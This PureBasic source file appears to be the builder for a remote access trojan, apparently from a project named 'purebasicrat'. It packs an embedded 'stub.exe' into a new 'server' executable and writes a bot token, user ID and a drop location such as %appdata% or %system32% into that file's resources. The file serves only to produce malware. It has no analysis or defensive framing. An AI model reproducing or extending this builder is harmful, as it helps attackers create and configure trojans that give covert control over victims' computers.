XIncludeFile "form.pbf"
XIncludeFile "resourcewriter.pbi"
EnableExplicit

Define event,gadget
Define savefile.s
Define *stubBuffer,bufferSize.q
Define.s botToken,userId,dropPath,exeName

OpenMainWindow()
AddGadgetItem(Combo_0,-1,"%appdata%")
AddGadgetItem(Combo_0,-1,"%tmp%")
AddGadgetItem(Combo_0,-1,"%programfiles%")
AddGadgetItem(Combo_0,-1,"%userprofile%")
AddGadgetItem(Combo_0,-1,"%windir%")
AddGadgetItem(Combo_0,-1,"%systemdrive%")
AddGadgetItem(Combo_0,-1,"%system32%")
SetGadgetState(Combo_0,0) ;set first value as default

Repeat
  event=WaitWindowEvent()
  Select event
    Case #PB_Event_Gadget
      gadget=EventGadget()
      Select gadget
        Case Button_about
          MessageRequester("About","Project : github.com/globalpolicy/purebasicrat"+
                                   #CRLF$+"Icon made by Flat Icons from www.flaticon.com"+
                                   #CRLF$+"MurmurHash3 by Wilbert at http://www.purebasic.fr",#PB_MessageRequester_Info)
        Case Button_create
          botToken=Trim(GetGadgetText(String_botToken))
          userId=Trim(GetGadgetText(String_userId))
          dropPath=GetGadgetText(Combo_0)
          exeName=GetGadgetText(String_exename)
          If botToken="" Or userId="":Continue:EndIf
          savefile=SaveFileRequester("Save output file..","server","Executable file (*.exe) | *.exe",0)
          If savefile
            savefile=savefile+".exe"
            bufferSize=?endmarker-?stub
            *stubBuffer=AllocateMemory(bufferSize)
            CopyMemory(?stub,*stubBuffer,?endmarker-?stub)
            If OpenFile(0,savefile,#PB_File_SharedWrite)
              If WriteData(0,*stubBuffer,bufferSize)
                CloseFile(0)
                If WriteStringToResource(savefile,botToken,"params","bottoken") And WriteStringToResource(savefile,userId,"params","userid") And WriteStringToResource(savefile,dropPath,"params","droppath") And WriteStringToResource(savefile,exeName,"params","exename")
                  MessageRequester("Done!","Server successfully created to"+#CRLF$+savefile,#PB_MessageRequester_Ok)    
                EndIf
              EndIf
            EndIf
          EndIf
      EndSelect
  EndSelect
  
Until event=#PB_Event_CloseWindow

DataSection
  stub:
  IncludeBinary "stub.exe"
  endmarker:
EndDataSection

; IDE Options = PureBasic 5.70 LTS (Windows - x86)
; CursorPosition = 28
; FirstLine = 18
; EnableAsm
; EnableThread
; EnableXP
; UseIcon = food.ico
; Executable = client.exe
; EnablePurifier